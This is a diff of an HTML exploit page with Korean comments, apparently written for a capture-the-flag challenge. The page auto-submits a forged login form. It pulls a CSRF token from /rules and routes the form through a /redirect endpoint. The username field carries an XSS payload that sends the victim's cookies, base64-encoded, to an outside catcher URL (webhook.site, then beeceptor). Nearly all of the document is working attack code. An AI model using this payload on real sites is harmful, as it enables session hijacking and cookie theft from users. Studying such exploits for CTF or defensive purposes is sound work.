@@ -1,45 +1,46 @@
 <html>
-  <body>
+<body>
+    <h1>Please wait...</h1>
     <script>
-      function startExploit() {
-        // 1. https://webhook.site/ 에 방문해서 고유 URL을 복사하세요.
-        // 2. 아래 'webhookUrl' 변수의 값을 복사한 URL로 바꾸세요.
-        const webhookUrl = 'https://webhook.site/37bdbd68-15e2-4abe-8c35-33e87e040b14';
+        // 1. /rules 페이지를 fetch하여 내용을 가져옵니다.
+        fetch('/rules')
+            .then(res => res.text())
+            .then(html => {
+                // 2. 페이지 내용에서 CSRF 토큰을 추출합니다.
+                const csrfToken = html.split('"X-CSRF-Token":"')[1].split('"')[0];
 
-        const form = document.createElement('form');
-        form.method = 'POST';
-        // 봇이 상호작용하는 CTF 서버 주소. (bot.js의 BASE_URL 참고)
-        form.action = 'http://127.0.0.1:58039/login'; 
+                // 3. 동적으로 form을 생성합니다.
+                const form = document.createElement('form');
+                form.method = 'POST';
+                
+                // 4. 여기가 핵심! action을 /login이 아닌 /redirect로 설정합니다.
+                // url 파라미터로 최종 목적지인 /login을 지정합니다.
+                form.action = '/redirect?url=/login';
 
-        const usernameInput = document.createElement('input');
-        usernameInput.type = 'hidden';
-        usernameInput.name = 'username';
-        
-        // 수정된 페이로드: CORS를 우회하기 위해 fetch() 대신 document.location을 사용
-        usernameInput.value = '<img src=x onerror="document.location='https://webhook.site/37bdbd68-15e2-4abe-8c35-33e87e040b14?data=' + btoa(document.cookie)" />';
-        
-        const passwordInput = document.createElement('input');
-        passwordInput.type = 'hidden';
-        passwordInput.name = 'password';
-        passwordInput.value = 'trigger-login-fail';
+                // 5. form에 필요한 데이터(XSS 페이로드, CSRF 토큰)를 채웁니다.
+                const userInput = document.createElement('input');
+                userInput.type = 'hidden';
+                userInput.name = 'username';
+                userInput.value = `<img src=x onerror="document.location='https://my-ctf-catcher.free.beeceptor.com?data='+btoa(document.cookie)">`;
 
-        const csrfInput = document.createElement('input');
-        csrfInput.type = 'hidden';
-        csrfInput.name = '_csrf';
-        csrfInput.value = '';
+                const csrfInput = document.createElement('input');
+                csrfInput.type = 'hidden';
+                csrfInput.name = '_csrf';
+                csrfInput.value = csrfToken;
 
-        form.appendChild(usernameInput);
-        form.appendChild(passwordInput);
-        form.appendChild(csrfInput);
+                const passInput = document.createElement('input');
+                passInput.type = 'hidden';
+                passInput.name = 'password';
+                passInput.value = 'pwned';
 
-        document.body.appendChild(form);
-        form.submit();
-      }
-      
-      // 페이지가 로드되면 바로 공격 시작
-      window.onload = startExploit;
+                form.appendChild(userInput);
+                form.appendChild(csrfInput);
+                form.appendChild(passInput);
+
+                // 6. form을 제출하여 CSPT 공격을 시작합니다.
+                document.body.appendChild(form);
+                form.submit();
+            });
     </script>
-    <h1>Executing...</h1>
-  </body>
+</body>
 </html>
-
